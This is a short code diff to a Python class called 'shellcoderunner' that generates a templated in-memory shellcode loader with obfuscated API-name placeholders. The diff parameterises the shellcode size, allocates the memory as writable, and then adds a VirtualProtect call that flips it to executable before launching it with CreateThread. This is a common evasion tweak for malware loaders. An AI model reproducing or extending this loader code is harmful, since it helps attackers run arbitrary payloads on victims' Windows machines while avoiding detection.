@@ -18,11 +18,14 @@ class shellcoderunner:
         return """
     {transformers}
 
-    local address = {VirtualAlloc}(c.NULL, 460, 0x3000, 0x40)
+    local address = {VirtualAlloc}(c.NULL, {shellcodeSize}, 0x3000, 0x04)
     local ptr = c.Pointer(shellcode[0])
 
-    {RtlMoveMemory}(address, ptr, 460)
+    {RtlMoveMemory}(address, ptr, {shellcodeSize})
 
+    local oldProtect = c.uint32_t()
+    {VirtualProtect}(address, {shellcodeSize}, 0x40, c.Pointer(oldProtect))
+    
     local thread = {CreateThread}(c.NULL, 0, address, c.NULL, 0, c.NULL)
     {WaitForSingleObject}(thread, 0xffffffff)
 """
